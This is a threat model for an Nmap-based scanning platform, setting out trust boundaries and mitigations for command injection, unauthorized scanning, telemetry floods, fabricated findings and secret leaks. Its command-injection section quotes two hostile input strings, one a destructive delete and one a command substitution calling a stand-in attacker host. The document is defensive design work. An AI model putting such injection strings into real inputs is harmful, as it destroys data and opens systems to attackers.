# Threat Model — Nmap-AI Security Intelligence Platform

## 1. Scope & Primary Assets

The primary assets protected by the system include:
1. **Underlying Host System**: Preventing arbitrary remote command execution, privilege escalation, or resource exhaustion.
2. **Authorized Scanning Scope**: Ensuring the scanner executes strictly against authorized target lab subnets.
3. **Evidence Integrity**: Guaranteeing audit provenance and preventing injection of fabricated findings or tampered alerts.
4. **Secrets & Configurations**: Safeguarding API keys (e.g. NVD API keys), authentication tokens, and private database credentials.

---

## 2. Trust Boundaries & Attack Surfaces

```text
[ Browser / Analyst ]
       │  (HTTPS/HTTP REST + WebSocket, X-API-Key Token)
═══════╪═════════════════════════════════════════════════════════ Trust Boundary 1
[ FastAPI Application Core ]
       │  (Safe Array Popen - shell=False)
═══════╪═════════════════════════════════════════════════════════ Trust Boundary 2
[ Operating System Process: Nmap ]
       │  (TCP / UDP Probing)
═══════╪═════════════════════════════════════════════════════════ Trust Boundary 3
[ Target Lab Network (Windows 10) ]
```

---

## 3. Threat Analysis & Mitigations

### Threat 1: Command Injection via Scan Target String
- **Vector**: An attacker inputs `; rm -rf /` or `192.168.1.1 $(curl evil.com)` into the scan target field.
- **Impact**: Arbitrary command execution with permissions of the backend process.
- **Mitigations**:
  1. **Strict Target Validation**: Target is parsed with Python's `ipaddress` library or checked against a strict regex before acceptance.
  2. **Zero Shell Interpolation**: Subprocess execution uses `argv` list arrays (`subprocess.Popen(argv, shell=False)`). No shell string concatenation is ever performed.

### Threat 2: Out-of-Scope or Indiscriminate Scanning
- **Vector**: A user initiates scans against unauthorized public IP addresses (e.g. `8.8.8.8` or cloud infrastructures).
- **Impact**: Unauthorized network reconnaissance, violation of acceptable use policies, legal liability.
- **Mitigations**:
  1. **Mandatory Target Allowlist**: Target must match a CIDR in the `authorized_targets` database table.
  2. **Explicit Operator Authorization**: Requires `confirm_authorization=True` and target re-entry matching `confirm_target`.
  3. **Safe Profile Constraints**: Exploitation, brute-force, and denial-of-service script categories are strictly omitted.

### Threat 3: Denial of Service via TCP Telemetry Stream
- **Vector**: An attacker sends infinite byte streams or malformed lengths to TCP port 9999.
- **Impact**: Memory exhaustion, parser crash, buffer overflow.
- **Mitigations**:
  1. **Length-Prefixed Framing**: Buffer parser requires a 4-byte big-endian header.
  2. **Maximum Frame Ceiling**: `MAX_FRAME` is capped at 65,535 bytes. Frame lengths exceeding this limit are discarded with error counters incremented.
  3. **Loopback Binding**: Telemetry listener defaults to `127.0.0.1` unless explicitly reconfigured.

### Threat 4: Deceptive Metrics & Hallucinated CVEs
- **Vector**: Platform generates false positive critical findings or fabricates attack counts to appear impressive.
- **Impact**: SOC analyst fatigue, misplaced remediation priorities, loss of audit credibility.
- **Mitigations**:
  1. **Evidence-Based Taxonomy**: Open ports are never automatically labeled vulnerable without verified checks.
  2. **Demo Mode Isolation**: Simulated test records are tagged `data_source='demo'` and strictly segregated from live evidence.
  3. **Explainable Risk Decomposition**: Risk scores are broken down into mathematical sub-components (CVSS, Exposure, Confidence, ML Signal).

### Threat 5: Credential & Secret Leakage
- **Vector**: Database connection strings with passwords or NVD API keys exposed in API responses or frontend client code.
- **Impact**: Unauthorized database access or API quota theft.
- **Mitigations**:
  1. **Backend Database Redaction**: `_redact_db()` sanitizes SQLite / PostgreSQL connection strings (`sqlite:///data/nmap_ai.db`).
  2. **Environment Variable Storage**: All secrets loaded from `.env` via `pydantic-settings`; zero secrets committed to git.
